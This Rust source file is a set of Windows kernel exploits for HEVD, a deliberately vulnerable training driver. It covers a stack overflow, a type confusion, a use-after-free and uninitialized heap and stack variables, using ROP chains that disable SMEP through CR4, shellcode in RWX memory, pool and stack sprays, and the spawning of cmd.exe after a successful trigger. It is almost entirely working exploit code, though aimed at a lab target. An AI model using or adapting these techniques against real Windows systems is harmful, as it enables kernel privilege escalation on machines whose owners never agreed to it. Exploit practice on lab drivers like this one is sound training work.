use std::ops::Index;

use crate::gadgets;
use crate::utils;
use crate::utils::Primitives;

use rand::Rng;

use windows::{
    Win32::Foundation::*, Win32::Storage::FileSystem::*, Win32::System::Memory::*,
    Win32::System::Pipes::*, Win32::System::Threading::*, Win32::System::IO::*,
};

#[link(name = "ntdll")]
extern "stdcall" {

    fn NtMapUserPhysicalPages(
        ProcessHandle: HANDLE,
        NumberOfPages: usize,
        UserPfnArray: *mut usize,
    ) -> NTSTATUS;
}

pub fn hevd_stack_buffer_overflow(shellcode: Vec<u8>) {
    let driver = utils::HEVDPrimitives::new();

    if driver.driver_handle == HANDLE(0) {
        panic!("Failed to obtain device handle");
    }

    let kernel_base = utils::lookup_base_address("ntoskrnl.exe");

    if kernel_base == 0 {
        panic!("Failed to obtain ntoskrnl.exe base address");
    }

    const PAYLOAD_LEN: usize = 3000;
    const OFFSET: usize = 0x103;

    let rop_nop = kernel_base + gadgets::ROP_NOP_GADGET;

    let mut big_buf: [usize; PAYLOAD_LEN] = [rop_nop as usize; PAYLOAD_LEN];

    let mut buf: Vec<usize> = Vec::with_capacity(PAYLOAD_LEN + 8);

    let rop_offset = OFFSET;
    let lp_address = 0;

    let pop_rcx = kernel_base + gadgets::POP_RCX_GADGET;
    let smep_value = gadgets::SMEP_VALUE;
    let smep_gadget = kernel_base + gadgets::MOV_CR4_GADGET;

    let shellcode_addr = unsafe {
        VirtualAlloc(
            lp_address as *mut std::os::raw::c_void,
            shellcode.len() * 2,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    unsafe {
        std::ptr::copy(
            shellcode.as_ptr(),
            shellcode_addr as *mut _,
            shellcode.len(),
        )
    };

    big_buf[rop_offset] = pop_rcx as usize;
    big_buf[rop_offset + 1] = smep_value ^ 1 << 20; // flip 20th bit
    big_buf[rop_offset + 2] = smep_gadget as usize;
    big_buf[rop_offset + 3] = shellcode_addr as usize;

    for byte in big_buf.iter() {
        buf.push(*byte);
    }

    let driver_cmd = unsafe {
        DeviceIoControl(
            driver.driver_handle,
            driver.stack_buffer_overflow_ioctl,
            buf.as_ptr() as *mut std::os::raw::c_void,
            buf.len() as u32,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
        .as_bool()
    };

    if driver_cmd {
        let mut startup_info: STARTUPINFOA = unsafe { std::mem::zeroed() };
        startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

        let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

        unsafe {
            CreateProcessA(
                windows::core::PCSTR(std::ptr::null_mut()),
                windows::core::PSTR(String::from("C:\\Windows\\System32\\cmd.exe\0").as_mut_ptr()),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                false,
                CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
                std::ptr::null_mut(),
                windows::core::PCSTR(std::ptr::null_mut()),
                &mut startup_info,
                &mut process_info,
            );
        }
    }
}

#[allow(dead_code)]
pub fn hevd_type_confusion(shellcode: Vec<u8>) {
    let driver = utils::HEVDPrimitives::new();

    if driver.driver_handle == HANDLE(0) {
        panic!("Failed to obtain device handle");
    }

    let kernel_base = utils::lookup_base_address("ntoskrnl.exe");

    if kernel_base == 0 {
        panic!("Failed to obtain ntoskrnl.exe base address");
    }

    struct UserObject {
        object_id: usize,
        object_type: usize,
    }

    let lp_address = 0;

    let shellcode_addr = unsafe {
        VirtualAlloc(
            lp_address as *mut std::os::raw::c_void,
            shellcode.len() * 2,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    unsafe {
        std::ptr::copy(
            shellcode.as_ptr(),
            shellcode_addr as *mut _,
            shellcode.len(),
        )
    };

    const PADDING_LEN: usize = 0x64;
    const ROP_LEN: usize = 0x64;

    let rop_index = 0;
    let stack_pivot_address = 0x83000000 as u64;

    let stack_address = stack_pivot_address - 0x1000;
    let stack_size = 0x14000;

    let stack_pivot = kernel_base + gadgets::STACK_PIVOT_GADGET;
    let pop_rcx = kernel_base + gadgets::POP_RCX_GADGET;
    let smep_value = gadgets::SMEP_VALUE;
    let smep_gadget = kernel_base + gadgets::MOV_CR4_GADGET;
    let rop_nop = kernel_base + gadgets::ROP_NOP_GADGET;

    let padding: [usize; PADDING_LEN] = [0x4141414141414141; PADDING_LEN];
    let mut rop: [usize; ROP_LEN] = [0x4141414141414141; ROP_LEN];

    rop[rop_index] = rop_nop as usize;
    rop[rop_index + 1] = rop_nop as usize;
    rop[rop_index + 2] = pop_rcx as usize;
    rop[rop_index + 3] = smep_value ^ 1 << 20; // flip 20th bit
    rop[rop_index + 4] = smep_gadget as usize;
    rop[rop_index + 5] = shellcode_addr as usize;

    let kernel_stack_addr = unsafe {
        VirtualAlloc(
            stack_address as *mut std::os::raw::c_void,
            stack_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if kernel_stack_addr.is_null() {
        println!("{}", "[!] Failed allocating kernel stack");
        return;
    }

    let lock_address = unsafe { VirtualLock(kernel_stack_addr, stack_size) }.as_bool();

    if !lock_address {
        println!("{}", "[!] Failed to lock address");
        return;
    }

    unsafe {
        std::ptr::copy(
            padding.as_ptr(),
            stack_pivot_address as *mut _,
            padding.len(),
        )
    };

    unsafe { std::ptr::copy(rop.as_ptr(), stack_pivot_address as *mut _, rop.len()) };

    let mut user_object = UserObject {
        object_id: 0x4141414141414141,
        object_type: stack_pivot as usize,
    };

    let user_object_ptr = &mut user_object as *mut _;

    let driver_cmd = unsafe {
        DeviceIoControl(
            driver.driver_handle,
            driver.type_confusion_ioctl,
            user_object_ptr as *mut std::os::raw::c_void,
            std::mem::size_of::<UserObject>() as u32,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
        .as_bool()
    };

    if driver_cmd {
        let mut startup_info: STARTUPINFOA = unsafe { std::mem::zeroed() };
        startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

        let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

        unsafe {
            CreateProcessA(
                windows::core::PCSTR(std::ptr::null_mut()),
                windows::core::PSTR(String::from("C:\\Windows\\System32\\cmd.exe\0").as_mut_ptr()),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                false,
                CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
                std::ptr::null_mut(),
                windows::core::PCSTR(std::ptr::null_mut()),
                &mut startup_info,
                &mut process_info,
            );
        }
    }
}

struct PipeHandles {
    read: HANDLE,
    write: HANDLE,
}

fn create_pipe_objects() -> PipeHandles {
    // HEVD Object Size = 0x60 + 0x10 (header) (0x70 total)

    let mut buffer: [usize; 0x28] = [0; 0x28]; // 0x28 + 0x48 (header of object) = 0x70 (target allocation size)
    let mut read_pipe = HANDLE(0);
    let mut write_pipe = HANDLE(0);
    let mut result_length = 0;

    let mut data: [usize; 0x28] = [0x4141414141414141; 0x28];

    unsafe { std::ptr::copy(data.as_mut_ptr(), buffer.as_mut_ptr(), 0x28) };

    if unsafe {
        !CreatePipe(
            &mut read_pipe as *mut _,
            &mut write_pipe,
            std::ptr::null(),
            0x28,
        )
        .as_bool()
    } {
        panic!("[!] Failed to create pipe");
    }

    if unsafe {
        !WriteFile(
            write_pipe,
            buffer.as_mut_ptr() as *mut _,
            0x28,
            &mut result_length,
            std::ptr::null_mut(),
        )
        .as_bool()
    } {
        panic!("[!] Failed to write to pipe");
    }

    return PipeHandles {
        read: read_pipe,
        write: write_pipe,
    };
}

#[allow(dead_code)]
pub fn hevd_use_after_free(shellcode: Vec<u8>) {
    // 1. Prepare Heap
    //    * Activate LFH (16+ consecutive allocations)
    //    * Force heap to create new page to serve new allocations
    // 2. Spray Sequential Objects
    // 3. Create Holes
    // 4. Allocate UAF Object (Falls into one of the holes randomly)
    // 5. Free UAF Object
    // 6. Spray Fake Object (Overtake Freed Object)
    // 7. Trigger UAF Object Use (Code Execution)

    let driver = utils::HEVDPrimitives::new();

    if driver.driver_handle == HANDLE(0) {
        panic!("Failed to obtain device handle");
    }

    let kernel_base = utils::lookup_base_address("ntoskrnl.exe");

    if kernel_base == 0 {
        panic!("Failed to obtain ntoskrnl.exe base address");
    }

    let mut bytes_written = 0;

    // Prepare heap to avoid chunks from getting merged (get us a fresh page to work in)

    println!("[*] Deframenting Pool");

    let mut defrag_pipe_handle_store = Vec::<PipeHandles>::new();

    for _ in 0..20000 {
        let pipe_handle = create_pipe_objects();
        defrag_pipe_handle_store.push(pipe_handle);
    }

    let mut seq_pipe_handle_store = Vec::<PipeHandles>::new();

    println!("[*] Spraying Sequential Objects");

    for _ in 0..60000 {
        let pipe_handle = create_pipe_objects();
        seq_pipe_handle_store.push(pipe_handle);
    }

    println!("[*] Creating Object Holes");

    for i in 0..seq_pipe_handle_store.len() {
        if i % 2 == 0 {
            let handles = seq_pipe_handle_store.index(i);

            unsafe {
                CloseHandle(handles.read);
                CloseHandle(handles.write);
            }
        }
    }

    println!("[*] Allocating UAF Object");

    unsafe {
        DeviceIoControl(
            driver.driver_handle,
            driver.allocate_uaf_ioctl,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            0,
            &mut bytes_written,
            std::ptr::null_mut(),
        );
    }

    println!("[*] Freeing UAF Object");

    unsafe {
        if !DeviceIoControl(
            driver.driver_handle,
            driver.free_uaf_ioctl,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            0,
            &mut bytes_written,
            std::ptr::null_mut(),
        )
        .as_bool()
        {
            panic!("[!] Failed freeing UAF object");
        }
    }

    println!("[*] Filling Holes with Fake Objects");

    let lp_address = 0;

    let shellcode_addr = unsafe {
        VirtualAlloc(
            lp_address as *mut std::os::raw::c_void,
            shellcode.len() * 2,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    unsafe {
        std::ptr::copy(
            shellcode.as_ptr(),
            shellcode_addr as *mut _,
            shellcode.len(),
        )
    };

    const PADDING_LEN: usize = 0x64;
    const ROP_LEN: usize = 0x64;

    let rop_index = 0;
    let stack_pivot_address = 0x83000000 as u64;

    let stack_address = stack_pivot_address - 0x1000;
    let stack_size = 0x14000;

    let stack_pivot = kernel_base + gadgets::STACK_PIVOT_GADGET;
    let pop_rcx = kernel_base + gadgets::POP_RCX_GADGET;
    let smep_value = gadgets::SMEP_VALUE;
    let smep_gadget = kernel_base + gadgets::MOV_CR4_GADGET;
    let rop_nop = kernel_base + gadgets::ROP_NOP_GADGET;

    let padding: [usize; PADDING_LEN] = [0x4141414141414141; PADDING_LEN];
    let mut rop: [usize; ROP_LEN] = [0x4141414141414141; ROP_LEN];

    rop[rop_index] = rop_nop as usize;
    rop[rop_index + 1] = rop_nop as usize;
    rop[rop_index + 2] = pop_rcx as usize;
    rop[rop_index + 3] = smep_value ^ 1 << 20; // flip 20th bit
    rop[rop_index + 4] = smep_gadget as usize;
    rop[rop_index + 5] = shellcode_addr as usize;

    let kernel_stack_addr = unsafe {
        VirtualAlloc(
            stack_address as *mut std::os::raw::c_void,
            stack_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if kernel_stack_addr.is_null() {
        println!("{}", "[!] Failed allocating kernel stack");
        return;
    }

    let lock_address = unsafe { VirtualLock(kernel_stack_addr, stack_size) }.as_bool();

    if !lock_address {
        println!("{}", "[!] Failed to lock address");
        return;
    }

    unsafe {
        std::ptr::copy(
            padding.as_ptr(),
            stack_pivot_address as *mut _,
            padding.len(),
        )
    };

    unsafe { std::ptr::copy(rop.as_ptr(), stack_pivot_address as *mut _, rop.len()) };

    let fake_obj: [u64; 16] = [stack_pivot; 16];

    for _ in 0..30000 {
        unsafe {
            if !DeviceIoControl(
                driver.driver_handle,
                driver.fake_object_ioctl,
                fake_obj.as_ptr() as *mut _,
                16,
                std::ptr::null_mut(),
                0,
                &mut bytes_written,
                std::ptr::null_mut(),
            )
            .as_bool()
            {
                panic!("[!] Failed allocating fake objects");
            }
        }
    }

    println!("[*] Triggering Use of UAF Object");

    let driver_cmd = unsafe {
        DeviceIoControl(
            driver.driver_handle,
            driver.use_uaf_ioctl,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
            0,
            &mut bytes_written,
            std::ptr::null_mut(),
        )
        .as_bool()
    };

    if driver_cmd {
        let mut startup_info: STARTUPINFOA = unsafe { std::mem::zeroed() };
        startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

        let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

        unsafe {
            CreateProcessA(
                windows::core::PCSTR(std::ptr::null_mut()),
                windows::core::PSTR(String::from("C:\\Windows\\System32\\cmd.exe\0").as_mut_ptr()),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                false,
                CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT,
                std::ptr::null_mut(),
                windows::core::PCSTR(std::ptr::null_mut()),
                &mut startup_info,
                &mut process_info,
            );
        }
    }
}

fn random_str(len: usize) -> String {
    const CHARSET: &[u8] = b"ABCD1337";
    let mut rng = rand::thread_rng();
    let one_char = || CHARSET[rng.gen_range(0..CHARSET.len())] as char;
    std::iter::repeat_with(one_char).take(len).collect()
}

pub fn hevd_uninitialized_heap_variable_takeover() {
    let driver = utils::HEVDPrimitives::new();

    if driver.driver_handle == HANDLE(0) {
        panic!("Failed to obtain device handle");
    }

    let kernel_base = utils::lookup_base_address("ntoskrnl.exe");

    if kernel_base == 0 {
        panic!("Failed to obtain ntoskrnl.exe base address");
    }

    let mut bytes_written = 0;

    println!("[*] Spraying Event Objects");

    let mut event_spray_store = Vec::<HANDLE>::new();

    for _ in 0..256 {
        let random_str = random_str(0xee);
        let payload = random_str;

        let new_event = unsafe {
            CreateEventA(
                std::ptr::null_mut(),
                true,
                false,
                windows::core::PCSTR(payload.as_ptr()),
            )
        };

        if new_event.is_err() {
            panic!("[!] Error allocating Event object");
        } else {
            event_spray_store.push(new_event.unwrap());
        }
    }

    println!("[*] Freeing Event Objects");

    for i in 0..event_spray_store.capacity() {
        let close_event = unsafe { CloseHandle(*event_spray_store.index(i)).as_bool() };
        if close_event == false {
            panic!("[!] Failed freeing Event object");
        }
    }

    let mut input_buffer = "\\x37\\x13\\xd3\\xba";
    let input_buffer_len = input_buffer.len() as u32;

    let input_buffer_ptr = &mut input_buffer as *mut _;

    println!("[*] Triggering Uninitialized Heap Variable Callback");

    unsafe {
        DeviceIoControl(
            driver.driver_handle,
            driver.uninitialized_heap_variable_ioctl,
            input_buffer_ptr as *mut _,
            input_buffer_len,
            std::ptr::null_mut(),
            0,
            &mut bytes_written,
            std::ptr::null_mut(),
        );
    }
}

pub fn hevd_uninitialized_stack_variable_takeover() {
    let driver = utils::HEVDPrimitives::new();

    if driver.driver_handle == HANDLE(0) {
        panic!("Failed to obtain device handle");
    }

    let kernel_base = utils::lookup_base_address("ntoskrnl.exe");

    if kernel_base == 0 {
        panic!("Failed to obtain ntoskrnl.exe base address");
    }

    let mut bytes_written = 0;

    println!("[*] Spraying Kernel Stack & Triggering Callback");

    let n_pages = 1024;
    let mut user_pfn_array: Vec<u8> = Vec::with_capacity(n_pages * 4);

    for _idx in 0..n_pages {
        user_pfn_array.push(0x41);
    }

    let mut input_buffer = "\\x37\\x13\\xd3\\xba";
    let input_buffer_len = input_buffer.len() as u32;

    let input_buffer_ptr = &mut input_buffer as *mut _;

    unsafe {
        NtMapUserPhysicalPages(HANDLE(0), n_pages, user_pfn_array.as_ptr() as *mut _);
    }

    unsafe {
        DeviceIoControl(
            driver.driver_handle,
            driver.uninitialized_stack_variable_ioctl,
            input_buffer_ptr as *mut _,
            input_buffer_len,
            std::ptr::null_mut(),
            0,
            &mut bytes_written,
            std::ptr::null_mut(),
        );
    }
}
